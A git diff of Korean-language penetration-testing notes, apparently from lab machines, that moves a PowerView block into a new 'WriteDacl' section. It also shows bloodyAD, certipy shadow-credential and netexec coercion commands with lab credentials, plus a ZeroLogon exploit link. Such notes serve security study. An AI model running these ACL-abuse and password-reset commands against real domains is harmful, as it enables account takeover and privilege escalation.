@@ -874,12 +874,6 @@ bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add generi
 # Shadow Credentail
 certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
 ```
-```powershell
-. .\powerview.ps1
-Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
-$cred = ConvertTo-SecureString '0xdf0xdf.' -AsPlainText -Force
-Set-DomainUserPassword GPOADM -AccountPassword $cred
-```
 
 ## KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 - 해당 오류가 발생하여 `certipy-ad`가 제대로 실행이 되지 않으면 `bloodyAD`를 사용하여 비밀번호 변경 시도.
@@ -1633,5 +1627,19 @@ netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus -o LISTENER=o
   <summary><strong>ZeroLogin</strong></summary>
 
 - https://github.com/dirkjanm/CVE-2020-1472
+  
+</details>
+
+---
+<details>
+  <summary><strong>WriteDacl</strong></summary>
+  
+- Windows 보안 모델에서 DACL을 수정하라는 명령을 받았을 때, 시스템은 즉시 "이 요청자가 WriteDacl(또는 이를 포함하는 GenericAll 등) 권한을 가지고 있는가?"를 확인.
+```powershell
+. .\powerview.ps1
+Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
+$cred = ConvertTo-SecureString '0xdf0xdf.' -AsPlainText -Force
+Set-DomainUserPassword GPOADM -AccountPassword $cred
+```
   
 </details>
